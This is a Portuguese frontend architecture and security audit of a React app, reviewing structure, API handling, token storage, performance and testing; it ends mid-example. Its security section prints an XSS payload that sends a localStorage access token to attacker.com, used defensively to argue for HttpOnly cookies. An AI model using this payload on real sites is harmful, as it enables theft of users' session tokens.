# 📋 AUDITORIA COMPLETA - ARQUITETURA REACT FRONTEND
**Projeto:** Automations Monitor  
**Data:** 28 de março de 2026  
**Framework:** React 18.3.1 + TypeScript + Vite  

---

## 📊 SUMÁRIO EXECUTIVO

O projeto frontend é bem estruturado com **arquitetura modular por features**, lazy loading de páginas e gestão de estado com React Query. Existem **pontos fortes em padrões de código**, mas também **vulnerabilidades de segurança críticas** (localStorage para tokens), **falta de testes** e **configuração TypeScript leniente**.

### Status Geral
- **Estrutura:** 🟢 Bem organizada
- **Padrões:** 🟢 Bom (com inconsistências)
- **Segurança:** 🔴 Crítica (armazenamento de tokens)
- **Testes:** 🔴 Praticamente inexistentes
- **Performance:** 🟡 Bom com oportunidades
- **TypeScript:** 🟡 Leniente (não configurado rigorosamente)

---

## 1️⃣ ESTRUTURA DE PASTAS

### ✅ Pontos Positivos

```
src/
├── features/          # Excelente: uma pasta por domínio
│   ├── auth/         # Autenticação bem isolada
│   ├── users/
│   ├── automations/
│   ├── departments/
│   ├── business/
│   ├── positions/
│   ├── executions/
│   ├── dashboard/
│   └── steps/
├── lib/              # Utilities centralizadas
│   ├── axios.ts      # Configuração HTTP
│   ├── jwt.ts        # Token management
│   ├── queryKeys.ts  # Query factory
│   ├── formatters.ts # Formatação de dados
│   └── utils.ts      # Helpers gerais
├── shared/           # Componentes reutilizáveis
│   ├── components/   # Shared UI components
│   ├── hooks/        # Custom hooks genéricos
│   ├── layout/       # Layout principal
│   └── types/        # Tipos compartilhados
├── providers/        # Context providers
├── routes/           # Configuração de rotas
├── pages/            # Páginas (lazy loaded)
├── components/       # UI library (shadcn/ui)
└── test/            # Configuração de testes
```

**Estrutura segue padrões reconhecidos:**
- ✅ Feature-based organization (não por tipo: actions, reducers)
- ✅ Separação clara: shared vs específico
- ✅ `lib/` centraliza configurações transversais
- ✅ Cada feature tem: api.ts, types.ts, hooks.ts, context.tsx

### ⚠️ Inconsistências

- ⚠️ Alguns features têm `hooks/` (users, business, automations, departments) enquanto outros usam `hooks.ts` na raiz. **Não há padrão consistente**
- ⚠️ Components dentro de features não seguem padrão nominalista claro
- ⚠️ Não há README.md documentando a estrutura para novos devs

### 💡 Recomendações

1. **Padronizar hooks em todas as features:**
   ```
   features/
   └── automations/
       ├── api.ts
       ├── types.ts
       ├── context.tsx
       ├── hooks/           # SEMPRE pasta, nunca arquivo
       │   ├── useAutomation.ts
       │   ├── useAutomationForm.ts
       │   └── index.ts      # Export barrel
       ├── components/
       └── index.ts
   ```

2. **Criar `/frontend/ARCHITECTURE.md`** documentando:
   - Feature structure
   - Padrões de importação
   - Quando usar Context vs Query
   - Convention over configuration

3. **Adicionar `.editorconfig`** para garantir consistência

---

## 2️⃣ PADRÕES DE CÓDIGO

### ✅ Pontos Positivos

#### A. Hooks Customizados Bem Organizados
```typescript
// ✅ Exemplo: useUserForm
// - Usa React Hook Form + Zod validation
// - Integra com React Query para mutações
// - Centraliza lógica de form
export function useUserForm({ open, editData, onSuccess, onClose }) {
    // Query client para invalidação
    const qc = useQueryClient();
    
    // Mutações bem tipadas
    const createMutation = useMutation({...});
    const updateMutation = useMutation({...});
    
    // Validação com Zod schema
    const form = useForm({
        resolver: zodResolver(userFormSchema),
        defaultValues,
    });
    // ...
}
```

#### B. Type Safety com Zod
- ✅ Schema validation em `useUserForm`, `useDepartmentForm`, `useAutomationForm`
- ✅ Uso de `z.infer<typeof schema>` para typos automáticos
- ✅ Mensagens de erro em português (UX adequada)

#### C. Query Keys Factory (queryKeys.ts)
```typescript
// ✅ Excelente padrão
export const queryKeys = {
    automations: {
        all: () => ['automations'] as const,
        list: (filters?, page?) => [...queryKeys.automations.all(), filters, page] as const,
        detail: (id) => [...queryKeys.automations.all(), id] as const,
    },
    // ... 50+ linhas bem organizadas
}
```
- ✅ Type-safe `as const` tuples
- ✅ Invalidação precisa de cache
- ✅ Centralizado em um único lugar

#### D. Error Boundary
```typescript
// ✅ Implementação adequada
export class ErrorBoundary extends Component<Props, State> {
    static getDerivedStateFromError(error: Error): State {}
    componentDidCatch(error: Error, info: ErrorInfo) {
        console.error('[ErrorBoundary]', error, info.componentStack);
    }
    // Fallback UI customizável
}
```

#### E. Lazy Loading de Páginas
```typescript
// ✅ Todas as 13 páginas com lazy loading
const Login = lazy(() => import('@/pages/Login'));
const Dashboard = lazy(() => import('@/pages/Dashboard'));
// ...
// Com Suspense fallback apropriado
<Suspense fallback={<FullPageLoader />}>
    <Routes>...</Routes>
</Suspense>
```

#### F. Interceptadores Axios Customizados
- ✅ Request interceptor: injeta token JWT automaticamente
- ✅ Response interceptor: trata 401, refaz request com novo token
- ✅ Queue de requisições falhadas durante refresh
- ✅ CustomEvents para comunicação entre contexto e interceptor

### ⚠️ Inconsistências

#### A. useCallback/useMemo - Inconsistentes
```typescript
// ❌ Às vezes não é usado quando deveria:
const filters = {
    business: filters.business,
    automation: filters.automation,
    // Cria novo objeto a cada render sem useMemo
};

// ✅ Às vezes é usado:
const kpiFilters = useMemo<KpiFilters>(() => ({...}), [deps]);
```
- Nem toda filtragem utiliza `useMemo`
- Nem todo callback utiliza `useCallback`

#### B. Forma de Importação Inconsistente
```typescript
// Algumas features
import { useUserForm } from './hooks/useUserForm';  // ✅ barrel export
import { useAutomationForm } from './hooks/useAutomationForm';  // ✅

// Template (deprecated):
const Login = lazy(() => import('@/pages/Login'));  // Dynamic import

// Alguns arquivos
import { cn } from "@/lib/utils";  // ✅ Path alias consistente
```

#### C. Error Handling - Alguns "catch ()" Silenciosos
```typescript
// ❌ Perde informação de erro
authApi.blacklist(refreshToken).catch(() => { });

// ❌ Não log
try {
    const fullUser = await fetchUserById(userId);
} catch {
    return null;  // Silencia o erro
}
```

#### D. React.FC vs function declaration
```typescript
// Mistura de padrões
export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
    // Pode caber em uma função simples
}

// vs
export function App() {
    // Função simples
}
```

### ❌ Problemas

#### A. TypeScript Muito Leniente
```json
// tsconfig.json
{
    "compilerOptions": {
        "allowJs": true,
        "noImplicitAny": false,        // ❌ Permite any implícito
        "noUnusedLocals": false,       // ❌ Permite variáveis não usadas
        "noUnusedParameters": false,   // ❌ Permite parâmetros não usados
        "strictNullChecks": false      // ❌ Permite null/undefined sem verificação
    }
}
```
**Impacto:** Permite erros que passariam despercebidos

#### B. Faltam Type Guards
```typescript
// ❌ Em vários arquivos:
const userId = Number(decoded?.user_id);
if (!Number.isFinite(userId)) { ... }  // Ficaria sem type narrowing com strict mode

// Deveria ser:
type DecodedToken = {
    user_id: number;
    exp: number;
    [key: string]: unknown;
};
```

#### C. Falta Validação de Variáveis de Ambiente
```typescript
// ❌ Sem type-safety
const api = axios.create({
  baseURL: import.meta.env.VITE_API_BASE_URL,  // Pode ser undefined
});

// Deveria ser (com Zod):
const EnvSchema = z.object({
    VITE_API_BASE_URL: z.string().url(),
});
const env = EnvSchema.parse(import.meta.env);
```

### 💡 Recomendações

1. **Ativar TypeScript Strict Mode:**
   ```json
   {
       "compilerOptions": {
           "strict": true,  // Ativa TODOS os checks
           "noUnusedLocals": true,
           "noUnusedParameters": true,
           "noImplicitReturns": true,
           "noFallthroughCasesInSwitch": true
       }
   }
   ```

2. **Padronizar useCallback/useMemo:**
   - Use ESlint plugin `eslint-plugin-react` com `rules: { 'react/no-unstable-nested-components': 'warn' }`
   - Aplicar `useMemo` em filtros/objetos passados como deps
   - Aplicar `useCallback` em handlers

3. **Implementar Type Guards Adequados:**
   ```typescript
   function isDecodedToken(value: unknown): value is DecodedToken {
       return (
           typeof value === 'object' &&
           value !== null &&
           'user_id' in value &&
           'exp' in value
       );
   }
   ```

4. **Validar Variáveis de Ambiente:**
   ```typescript
   // lib/env.ts
   import { z } from 'zod';
   
   const envSchema = z.object({
       VITE_API_BASE_URL: z.string().url('Deve ser uma URL válida'),
       VITE_APP_NAME: z.string().optional(),
   });
   
   export const env = envSchema.parse(import.meta.env);
   ```
   Usar `env` em vez de `import.meta.env` diretamente

5. **Adicionar Regra ESLint para consistência:**
   ```javascript
   {
       rules: {
           'prefer-const': 'error',
           'react-hooks/exhaustive-deps': 'warn',
           '@typescript-eslint/no-unused-vars': 'warn',
           '@typescript-eslint/explicit-function-return-types': 'error'
       }
   }
   ```

---

## 3️⃣ API E COMUNICAÇÃO

### ✅ Pontos Positivos

#### A. Configuração Centralizada de Axios
```typescript
// lib/axios.ts - Bem estruturado
const api = axios.create({
    baseURL: import.meta.env.VITE_API_BASE_URL,
});

// Request interceptor: injeta token
api.interceptors.request.use((config) => {
    const token = localStorage.getItem('access_token');
    if (token && config.headers) {
        config.headers.Authorization = `Bearer ${token}`;
    }
    return config;
});

// Response interceptor: trata 401
api.interceptors.response.use(
    (response) => response,
    async (error: AxiosError) => {
        if (error.response?.status === 401) {
            // Tenta refazer com novo token
            // Queue para requests falhadas enquanto refresha
        }
    }
);
```

#### B. Padrão de API Service Consistente
```typescript
// Todas as features seguem este padrão
export const usersApi = {
    list: (filters?) => api.get<PaginatedResponse<User>>('/api/users/', { params: filters }),
    getById: (id: number) => api.get<User>(`/api/users/${id}/`),
    create: (data: UserCreate) => api.post<User>('/api/users/', data),
    patch: (id: number, data: UserUpdate) => api.patch<User>(`/api/users/${id}/`, data),
};
```
- ✅ Type-safe responses
- ✅ Padrão RESTful
- ✅ Reuso através de hooks

#### C. Hooks de Query Bem Estruturados
```typescript
// Excelente padrão:
export function useUsers(filters?: UserFilters, page = 1) {
    return useQuery({
        queryKey: queryKeys.users.list(filters, page),
        queryFn: () => usersApi.list({ ...filters, page }).then((res) => res.data),
    });
}

export function useCreateUser() {
    const qc = useQueryClient();
    return useMutation({
        mutationFn: (data: UserCreate) => usersApi.create(data),
        onSuccess: () => qc.invalidateQueries({ queryKey: queryKeys.users.all() }),
    });
}
```
- ✅ Separation of concerns (API, Query, Type)
- ✅ Cache invalidation automática
- ✅ Retry logic padrão

#### D. Suporte a Multipart FormData
```typescript
// ✅ Business e Users features lidam com upload
function buildFormData(data: BusinessCreate | BusinessUpdate): FormData {
    const formData = new FormData();
    Object.entries(data).forEach(([key, value]) => {
        if (value !== undefined && value !== null) {
            formData.append(key, value instanceof File ? value : String(value));
        }
    });
    return formData;
}

export const businessApi = {
    create: (data: BusinessCreate) =>
        api.post<Business>("/api/business/", buildFormData(data), {
            headers: { 'Content-Type': 'multipart/form-data' },
        }),
};
```

#### E. Token Refresh com Queue
- ✅ Evita múltiplas requisições de refresh simultâneas
- ✅ Fila de requisições e aguarda novo token
- ✅ Comunica com AuthContext via CustomEvent

### ⚠️ Inconsistências

#### A. Tratamento de Erro Inconsistente
```typescript
// ❌ Alguns erros ignorados
authApi.blacklist(refreshToken).catch(() => { });

// ⚠️ Alguns não verificam status
try {
    const fullUser = await fetchUserById(userId);
} catch {
    return null;  // Poderia ser erro de rede ou 500
}

// ⚠️ Alguns usam .catch() vs try/catch
```

#### B. Validação de Endpoint Hardcoded
```typescript
// ❌ Verificação manual de URLs
const AUTH_ENDPOINTS = ['/api/token/', '/api/token/refresh/', '/api/token/verify/'];
const isAuthEndpointRequest = (requestUrl?: string) => {
    if (!requestUrl) return false;
    return AUTH_ENDPOINTS.some((endpoint) => requestUrl.includes(endpoint));
};
// Precisa ser atualizada manualmente se API muda
```

#### C. Falta de Request Timeout
```typescript
// ❌ Sem timeout configurado
const api = axios.create({
    baseURL: import.meta.env.VITE_API_BASE_URL,
    // timeout missing!
});
```

### ❌ Problemas

#### A. Sem Tratamento Específico de Erros
```typescript
// ❌ Toast genérico sempre
toast.error('Erro ao salvar usuário. Verifique os dados e tente novamente.');

// Deveria ser:
if (error.response?.status === 400) {
    // Erro de validação - mostrar campos específicos
} else if (error.response?.status === 409) {
    // Conflito - por ex, email duplicado
} else if (error.response?.status === 500) {
    // Erro do servidor
}
```

#### B. CustomEvent para Comunicação
```typescript
// ❌ Usando window.dispatchEvent (anti-pattern)
window.dispatchEvent(new CustomEvent('auth:token-refreshed', { detail: {...} }));
window.addEventListener('auth:token-refreshed', handleTokenRefreshed);

// Deveria usar:
// - Zustand para estado global
// - Redux com thunks
// - RxJS subjects
// - ou EventEmitter pattern
```

#### C. Sem Tratamento de Offline
```typescript
// ❌ Não há cache de requisições para offline
// ❌ Não há retry automático com backoff exponencial
```

### 💡 Recomendações

1. **Implementar Tratamento Centralizado de Erros:**
   ```typescript
   // lib/api-error.ts
   export function handleApiError(error: AxiosError): string {
       if (error.response?.status === 400) {
           return 'Dados inválidos. Verifique os campos.';
       }
       if (error.response?.status === 409) {
           return 'Recurso duplicado.';
       }
       if (error.response?.status === 500) {
           return 'Erro do servidor. Tente novamente.';
       }
       return 'Erro ao processar requisição.';
   }
   ```

2. **Adicionar Timeout ao Axios:**
   ```typescript
   const api = axios.create({
       baseURL: import.meta.env.VITE_API_BASE_URL,
       timeout: 10000,  // 10s
   });
   ```

3. **Integrar React Query com Offline:**
   ```typescript
   const queryClient = new QueryClient({
       defaultOptions: {
           queries: {
               retry: (failureCount, error) => {
                   if (navigator.onLine) {
                       return failureCount < 3;
                   }
                   return false;
               },
               retryDelay: (attemptIndex) => 
                   Math.min(1000 * 2 ** attemptIndex, 30000),
           },
       },
   });
   ```

4. **Substituir CustomEvent por State Management:**
   ```typescript
   // Usar Context ou Zustand
   // Mais type-safe e testável
   ```

5. **Validar Respostas com Zod:**
   ```typescript
   const UserSchema = z.object({
       id: z.number(),
       username: z.string(),
       email: z.string().email(),
   });
   
   export const usersApi = {
       getById: (id: number) =>
           api.get<User>(`/api/users/${id}/`).then(res => 
               UserSchema.parse(res.data)
           ),
   };
   ```

---

## 4️⃣ SEGURANÇA

### ⚠️ Problemas Críticos

#### 🔴 A. Tokens Armazenados em localStorage

**RISCO CRÍTICO DE XSS**

```typescript
// ❌ Atual (inseguro)
localStorage.setItem('access_token', data.access);
localStorage.setItem('refresh_token', data.refresh);

const token = localStorage.getItem('access_token');
```

**Por quê é perigoso:**
- localStorage é acessível via `window.localStorage` em JavaScript
- Qualquer injeção XSS consegue acessar tokens: `eval(injected_code)` → `localStorage.getItem('access_token')`
- Tokens não expirão automaticamente (lifetime depende do servidor)
- Vulnerável a ataques CSRF se a aplicação não usar CSRF tokens

**Exemplo de ataque:**
```javascript
// Injeção XSS em comentário/mensagem
<img src=x onerror="fetch('https://attacker.com?token='+localStorage.getItem('access_token'))">
// Servidor atacante recebe o token
```

**Solução: Armazenar em HttpOnly Cookies**
```typescript
// ✅ O servidor define cookies HttpOnly
// Set-Cookie: access_token=xyz; HttpOnly; Secure; SameSite=Strict
// Navegador injeta automaticamente em headers

// Cliente consegue acessar apenas via API, não via JavaScript
// JavaScript: localStorage.getItem('access_token') === null
// Header: Authorization: Bearer xyz ✅ (injetado automaticamente)
```

#### 🔴 B. Sem CORS Configurado

```typescript
// ❌ Não há verificação de CORS
const api = axios.create({
    baseURL: import.meta.env.VITE_API_BASE_URL,
    // Sem headers CORS, sem credentials
});

// ❌ Sem preflight handling
```

**Risco:** Requisições cross-origin podem ser bloqueadas ou aceitas inadequadamente

#### 🔴 C. Sem HTTPS/CSP Configurado

```html
<!-- ❌ Não há Content-Security-Policy header -->
<!-- ❌ Não há Strict-Transport-Security -->
<!-- ❌ Não há X-Frame-Options -->
<!-- ❌ Não há X-Content-Type-Options -->
```

#### 🔴 D. JWT Decodificado sem Validação de Assinatura

```typescript
// ❌ Apenas decodifica, não verifica assinatura
export function decodeJwt(token: string) {
    const base64Url = token.split('.')[1];
    const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
    const jsonPayload = decodeURIComponent(
        window.atob(base64)
            .split('')
            .map((c) => '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2))
            .join('')
    );
    return JSON.parse(jsonPayload);
}
```

**Risco:** Alguém poderia modificar o payload no cliente (e o servidor rejeitaria, mas lógica poderia quebrar)

**Solução:** Confiar apenas em tokens do servidor

### ⚠️ Inconsistências de Segurança

#### A. Falta Validação em Alguns Pontos
```typescript
// ❌ Confia em decoded?.user_id sem validação
const userId = Number(decoded?.user_id);
if (!Number.isFinite(userId)) {
    throw new Error('Token sem user_id valido');
}
// Se o token foi forjado, isso pode deixar passar valores inválidos
```

#### B. Refresh Token Expiry Verificado Apenas Client-Side
```typescript
// ❌ Depende do cliente verificar expiração
if (storedRefreshToken && !isTokenExpired(storedRefreshToken)) {
    // Mas um atacante poderia modificar o token localmente
}
```

### ✅ Pontos Positivos de Segurança

- ✅ Logout automático ao expirar refresh token
- ✅ Blacklist de tokens na API (chamada em logout)
- ✅ Protected routes bloqueiam acesso sem autenticação
- ✅ UserID extraído do token, não de URL/params

### 💡 Recomendações Críticas

**1. IMEDIATO: Migrar para HttpOnly Cookies**

```typescript
// ✅ Novo fluxo
// Backend: Set-Cookie: access_token=xyz; HttpOnly; Secure; SameSite=Strict

// Frontend: Axios injeta automaticamente
const api = axios.create({
    baseURL: import.meta.env.VITE_API_BASE_URL,
    withCredentials: true,  # Permite cookies em requisições
});

// ✅ Remove localStorage completamente
// localStorage.setItem('access_token', ...);  // ❌ REMOVE ISSO
// localStorage.getItem('access_token');       // ❌ REMOVE ISSO
```

**2. Configurar CORS Adequadamente (Backend)**
```python
# Django/Backend
CORS_ALLOWED_ORIGINS = [
    "https://seu-dominio.com",  # Apenas HTTPS em produção
]
CORS_ALLOW_CREDENTIALS = True
CORS_ALLOW_HEADERS = ['authorization', 'content-type']
```

**3. Adicionar Security Headers (Nginx/Backend)**
```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "DENY" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'" always;
add_header X-XSS-Protection "1; mode=block" always;
```

**4. Implementar CSRF Protection**
```typescript
// Se não usar cookies HttpOnly, implementar CSRF token:
const csrfToken = document.querySelector('[name=csrf-token]')?.getAttribute('content');
api.defaults.headers.common['X-CSRF-Token'] = csrfToken;
```

**5. Content Security Policy no HTML**
```html
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Security-Policy" content="
        default-src 'self';
        script-src 'self' 'unsafe-inline' 'unsafe-eval';
        style-src 'self' 'unsafe-inline';
        img-src 'self' data: https:;
    ">
</head>
</html>
```

**6. Validar Dados Rigorosamente**
```typescript
// Use Zod parser em responses
const TokenSchema = z.object({
    access: z.string().min(1),
    refresh: z.string().min(1),
});

const response = await api.post('/api/token/', credentials);
const validated = TokenSchema.parse(response.data);
```

---

## 5️⃣ PERFORMANCE

### ✅ Pontos Positivos

#### A. Lazy Loading de Páginas Implementado
```typescript
const Login = lazy(() => import('@/pages/Login'));
const Dashboard = lazy(() => import('@/pages/Dashboard'));
// ... todas as 13 páginas

<Suspense fallback={<FullPageLoader />}>
    <Routes>...</Routes>
</Suspense>
```
- ✅ Code splitting automático do Vite
- ✅ Reduz bundle size inicial
- ✅ Carrega apenas quando necessário

#### B. Query Caching com React Query
```typescript
// Configuração adequada
const queryClient = new QueryClient({
    defaultOptions: {
        queries: {
            retry: 1,
            refetchOnWindowFocus: false,  // ✅ Evita re-fetch desnecessário
        },
    },
});
```
- ✅ Não refetch ao mudar de aba
- ✅ Retry automático com limite

#### C. Uso de useMemo em Dados Caros
```typescript
// ✅ Dashboard
const kpiFilters = useMemo<KpiFilters>(
    () => ({
        business: filters.business,
        automation: filters.automation,
        // ...
    }),
    [filters.business, filters.automation, /* deps */],
);

// ✅ EvolutionChart
const chartData = useMemo(
    () =>
        data.map((item) => ({
            periodLabel: formatPeriod(item.period, groupBy),
            executions: item.total_executions,
            // ...
        })),
    [data, groupBy],
);
```

#### D. Bundle Otimizado com Vite
```typescript
// vite.config.ts
export default defineConfig(() => ({
    plugins: [react()],  # Usa React Fast Refresh
    resolve: {
        alias: {
            "@": path.resolve(__dirname, "./src"),
        },
    },
}));
```
- ✅ HMR (Hot Module Replacement) rápido
- ✅ Download inicial otimizado

### ⚠️ Inconsistências de Performance

#### A. useCallback/useMemo Não Aplicados Universalmente
```typescript
// ❌ Alguns handlers não usam useCallback
const handleFilter = (v: Record<string, string>) => {
    setFilters(v as unknown as TFilters);  // Recria a cada render
};

// ❌ Alguns filters criam novo objeto sem useMemo
const filters = {
    business: filters.business,
    // Sem useMemo, novo objeto a cada render
};
```

#### B. React.memo Não Aplicado
```typescript
// Nenhum componente encontrado com React.memo
// Possível re-render desnecessário de componentes
```

#### C. Imagens Não Otimizadas
```typescript
// ❌ Usar imagens diretamente sem otimização
<img src={product.image} />

// Deveria ter lazy loading nativo
<img src={product.image} loading="lazy" />
```

### ❌ Problemas de Performance

#### A. Sem Paginação em Some Lists
```typescript
// ✅ Executions, Users, etc têm paginação

// ❌ Sem limite de items por página em alguns casos
```

#### B. Sem Observador de Viewport
```typescript
// Scroll infinito não implementado
// Todos os items carregados de uma vez
```

#### C. sem Debounce/Throttle em Search
```typescript
// ❌ Se houver live search, sem debounce
const handleSearch = (query: string) => {
    setSearchQuery(query);  // Requisição a cada letra digitada
};

// Deveria haver debounce:
const debouncedSearch = useDebouncedCallback(setSearchQuery, 300);
```

### 💡 Recomendações

**1. Aplicar useCallback Universalmente**
```typescript
// shared/hooks/useTableState.ts
export function useTableState<TFilters extends Record<string, unknown>>() {
    const [filters, setFilters] = useState<TFilters>({} as TFilters);
    const [page, setPage] = useState(1);

    useEffect(() => {
        setPage(1);
    }, [filters]);

    // ✅ Memoizar callbacks
    const handleFilter = useCallback((v: Record<string, string>) => {
        setFilters(v as unknown as TFilters);
    }, []);

    const handleClear = useCallback(() => {
        setFilters({} as TFilters);
    }, []);

    return { filters, page, setPage, handleFilter, handleClear };
}
```

**2. Usar React.memo para Componentes Puros**
```typescript
// ✅ Para componentes que recebem props estáticas
export const StatusBadge = React.memo(({ status }: StatusBadgeProps) => (
    // render
));

// ✅ Com dependência de objetos:
export const FilterBar = React.memo(
    ({ filters, onFilterChange }: FilterBarProps) => (
        // render
    ),
    (prevProps, nextProps) => {
        // Custom comparison se necessário
        return prevProps.filters === nextProps.filters;
    }
);
```

**3. Implementar Debounce para Search**
```typescript
// lib/hooks/useDebounce.ts
export function useDebounce<T>(value: T, delay: number): T {
    const [debouncedValue, setDebouncedValue] = useState(value);

    useEffect(() => {
        const handler = setTimeout(() => {
            setDebouncedValue(value);
        }, delay);

        return () => clearTimeout(handler);
    }, [value, delay]);

    return debouncedValue;
}

// Uso:
const debouncedSearch = useDebounce(searchQuery, 300);
useEffect(() => {
    // Buscar apenas após 300ms de inatividade
    refetch({ search: debouncedSearch });
}, [debouncedSearch]);
```

**4. Lazy Load Imagens**
```typescript
<img src={photo} loading="lazy" alt="..." />
```

**5. Implementar Virtual Scrolling para Listas Grandes**
```typescript
// Usar react-window ou similar para tabelas com 1000+ items
import { FixedSizeList } from 'react-window';
```

---

## 6️⃣ ESTADO GLOBAL

### ✅ Pontos Positivos

#### A. React Query para State Assíncrono
```typescript
// ✅ Excelente separação: Query para dados do servidor
export const useUsers = (filters?: UserFilters, page = 1) => {
    return useQuery({
        queryKey: queryKeys.users.list(filters, page),
        queryFn: () => usersApi.list({ ...filters, page }).then((res) => res.data),
    });
};

// Automático:
// - Caching
// - Refetch
// - Loading/Error states
// - Retry
```

#### B. Context API para Auth (OK, mas poderia ser Query)
```typescript
// ✅ Isolado em AuthProvider
export const AuthContext = createContext<AuthContextType | undefined>(undefined);

export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
    const [user, setUser] = useState<User | null>(null);
    const [isLoading, setIsLoading] = useState(true);
    // ...
};

// Hook customizado
export function useAuth() {
    const context = useContext(AuthContext);
    if (!context) {
        throw new Error('useAuth must be used within an AuthProvider');
    }
    return context;
}
```
- ✅ Protegido com hook
- ✅ Error se usado fora do provider

#### C. AppProviders Bem Estruturado
```typescript
// ✅ Ordem clara de providers
export function AppProviders({ children }: AppProvidersProps) {
    return (
        <QueryClientProvider client={queryClient}>
            <TooltipProvider>
                <Toaster />
                <BrowserRouter>
                    <AuthProvider>{children}</AuthProvider>
                </BrowserRouter>
            </TooltipProvider>
            {import.meta.env.DEV && <ReactQueryDevtools initialIsOpen={false} />}
        </QueryClientProvider>
    );
}
```

#### D. Sem Props Drilling Excessivo
```typescript
// ✅ Dados vêm de hooks, não de props
const { data: users } = useUsers();
// Em vez de:
// <UserList users={users} />  ← props drilling
```

### ⚠️ Inconsistências

#### A. Auth Context Usa localStorage (Já mencionado em Segurança)
```typescript
// ⚠️ Armazenamento inseguro
localStorage.setItem('access_token', data.access);
const token = localStorage.getItem('access_token');
```

#### B. CustomEvent para Comunicação
```typescript
// ⚠️ Anti-pattern
window.dispatchEvent(new CustomEvent('auth:token-refreshed', { detail: {...} }));
window.addEventListener('auth:token-refreshed', handleTokenRefreshed);

// Melhor seria:
// - State management (Zustand)
// - Redux
// - Context
// - EventEmitter padrão
```

#### C. Sem Zustand/Redux para UI State
```typescript
// ⚠️ Alguns componentes usam useState local
// Para tema, linguagem, etc seria melhor estado global
const [theme, setTheme] = useState('dark');  // Local, mas usado globalmente
```

### ❌ Problemas

#### A. Falta Provider Wrapper Pattern
```typescript
// ❌ Sem padrão para criar providers
// Cada novo provider adicionado manualmente

// Deveria ter:
interface AppProvidersCompositorProps {
    children: React.ReactNode;
}
```

#### B. Sem Persistência de State UI
```typescript
// ❌ Tema, filtros, etc não persistem após F5
// localStorage.setItem seria apropriado aqui (diferente de tokens sensíveis)
```

### 💡 Recomendações

**1. Criar Zustand Store para UI State**
```typescript
// lib/store/useUiStore.ts
import { create } from 'zustand';
import { persist } from 'zustand/middleware';

export const useUiStore = create(
    persist(
        (set) => ({
            theme: 'dark' as 'dark' | 'light',
            sidebarOpen: true,
            setTheme: (theme: 'dark' | 'light') => set({ theme }),
            setSidebarOpen: (open: boolean) => set({ sidebarOpen: open }),
        }),
        {
            name: 'ui-store',  # Persiste em localStorage
        }
    )
);

// Uso:
export function App() {
    const { theme } = useUiStore();
    // ...
}
```

**2. Mover Auth para React Query (Opcional)**
```typescript
// Se a auth for simples, pode estar em Query também:
const useCurrentUser = () =>
    useQuery({
        queryKey: ['user', 'current'],
        queryFn: () => api.get('/api/user/me/').then(res => res.data),
        staleTime: Infinity,  // Não refetch automaticamente
    });
```

**3. Substituir CustomEvent por EventEmitter**
```typescript
// lib/events/authEvents.ts
import EventEmitter from 'eventemitter3';

export const authEvents = new EventEmitter();

// No interceptor:
authEvents.emit('token:refreshed', { access, refresh });

// No context:
useEffect(() => {
    const handler = ({ access, refresh }: TokenRefreshEvent) => {
        scheduleLogout(refresh);
    };
    authEvents.on('token:refreshed', handler);
    return () => authEvents.off('token:refreshed', handler);
}, []);
```

**4. Adicionar Redux DevTools (Opcional)**
```typescript
// Se usar Zustand:
import { devtools } from 'zustand/middleware';

export const useUiStore = create(
    devtools(
        persist(
            (set) => ({ /* ... */ }),
            { name: 'ui-store' }
        ),
        { name: 'UIStore' }
    )
);
```

---

## 7️⃣ TESTES E QUALIDADE

### ❌ Problemas Críticos

#### A. Praticamente Sem Testes
```typescript
// test/example.test.ts - Único arquivo de teste
describe("example", () => {
  it("should pass", () => {
    expect(true).toBe(true);
  });
});
```
- ❌ Cobertura de testes: praticamente 0%
- ❌ Sem testes de integração
- ❌ Sem testes de componentes
- ❌ Sem testes de hooks
- ❌ Sem testes de API

#### B. Configuração Vitest Existe Mas Não Usada
```typescript
// vitest.config.ts - Existe, mas não há testes
export default defineConfig({
  test: {
    environment: "jsdom",
    globals: true,
    setupFiles: ["./src/test/setup.ts"],
    include: ["src/**/*.{test,spec}.{ts,tsx}"],
  },
});
```

### ✅ Pontos Positivos de Testes

- ✅ Vitest configurado
- ✅ Testing Library disponível
- ✅ JSDOM environment definido
- ✅ Setup files criados

### ⚠️ ESLint/Code Quality

#### A. ESLint Muito Leniente
```javascript
// eslint.config.js
rules: {
    "react-refresh/only-export-components": ["warn", { allowConstantExport: true }],
    "@typescript-eslint/no-unused-vars": "off",  // ❌ Permite variáveis não usadas
},
```

#### B. Sem Prettier Configurado
```typescript
// Não há .prettierrc ou prettier.config.js
// Code formatting pode ser inconsistente
```

### 💡 Recomendações

**1. Criar Strategy de Testes (Pirâmide de Testes)**

```
          /\
         /  \  End-to-End (Playwright) - 10-20%
        /____\
       /      \
      /        \ Integration - 20-30%
     /          \
    /__________  \
   /            \
  /              \ Unit - 50-70%
 /________________\
```

**2. Setup Testing Infrastructure**

```typescript
// test/setup.ts
import { expect, afterEach, vi } from 'vitest';
import { cleanup } from '@testing-library/react';
import '@testing-library/jest-dom';

// Limpar componentes após cada teste
afterEach(() => cleanup());

// Mock de objetos globais
vi.stubGlobal('fetch', vi.fn());
```

**3. Criar Testes de Componentes**

```typescript
// src/features/auth/__tests__/Login.test.tsx
import { describe, it, expect, vi } from 'vitest';
import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import Login from '../Login';

describe('Login Component', () => {
    it('should render login form', () => {
        render(<Login />);
        expect(screen.getByLabelText(/usuário/i)).toBeInTheDocument();
    });

    it('should submit credentials', async () => {
        const user = userEvent.setup();
        const mockLogin = vi.fn();
        
        render(<Login onSubmit={mockLogin} />);
        
        await user.type(screen.getByLabelText(/usuário/i), 'testuser');
        await user.type(screen.getByLabelText(/senha/i), 'password123');
        await user.click(screen.getByRole('button', { name: /entrar/i }));
        
        expect(mockLogin).toHaveBeenCalledWith({
            username: 'testuser',
            password: 'password123',
        });
    });
});
```

**4. Criar Testes de Hooks**

```typescript
// src/features/users/__tests__/useUserForm.test.ts
import { describe, it, expect } from 'vitest';
import { renderHook, act } from '@testing-library/react';
import { useUserForm } from '../hooks/useUserForm';

describe('useUserForm', () => {
    it('should validate username', async () => {
